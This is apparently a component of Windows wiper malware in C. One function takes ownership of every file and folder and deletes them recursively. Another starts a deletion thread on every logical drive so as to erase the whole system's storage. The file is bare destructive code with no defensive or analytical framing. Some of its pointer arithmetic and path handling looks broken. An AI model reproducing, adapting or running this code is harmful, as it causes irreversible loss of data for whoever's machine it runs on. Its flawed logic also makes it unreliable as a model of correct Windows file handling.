#include "przejebane.h"

BOOL
WINAPI
FileDelete(
	_In_ PWSTR szDirectory
)
{
	TakeOwnership( szDirectory );

	WCHAR szSearchDirectory[ MAX_PATH ] = { 0 };
	lstrcpyW( szSearchDirectory, szDirectory );
	lstrcatW( szSearchDirectory, L"*.*" );

	WIN32_FIND_DATA w32FindData;
	HANDLE hFileSearch = FindFirstFileW( szSearchDirectory, &w32FindData );

	if ( hFileSearch == INVALID_HANDLE_VALUE )
	{
		return FALSE;
	}
	else do
	{
		if ( !lstrcmpW( w32FindData.cFileName, L"." ) || !lstrcmpW( w32FindData.cFileName, L"..") || 
			w32FindData.dwFileAttributes & FILE_ATTRIBUTE_REPARSE_POINT )
		{
			continue;
		}

		WCHAR szSearchPath[ MAX_PATH ] = { 0 };
		lstrcpyW( szSearchPath, szDirectory );
	    lstrcatW( szSearchPath, w32FindData.cFileName );

		TakeOwnership( szSearchPath );

		if ( w32FindData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY )
		{
			FileDelete( szSearchPath );
			lstrcatW( szSearchPath, L"\\" );
			RemoveDirectoryW( szSearchPath );
		}
		else
		{
			DeleteFileW( szSearchPath );
		}
	}

	while ( FindNextFileW( hFileSearch, &w32FindData) );
	RemoveDirectoryW( szDirectory);
	FindClose( hFileSearch );

	return TRUE;
}

VOID
WINAPI
DriveDelete(
	VOID
)
{
	WCHAR szTempDrives[ 512 ] = { 0 };
	DWORD dwLength = GetLogicalDriveStringsW( 512, szTempDrives );

	CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )FileDelete, szTempDrives, NULL, 0, NULL );

	for ( INT i = 0; i < dwLength; i++ )
	{
		if ( !szTempDrives[ i ] )
		{
			 CreateThread( NULL, 0, ( PTHREAD_START_ROUTINE )FileDelete, szTempDrives + ( i + 1 ) * sizeof( WCHAR ), 0, NULL );
		}
	}
}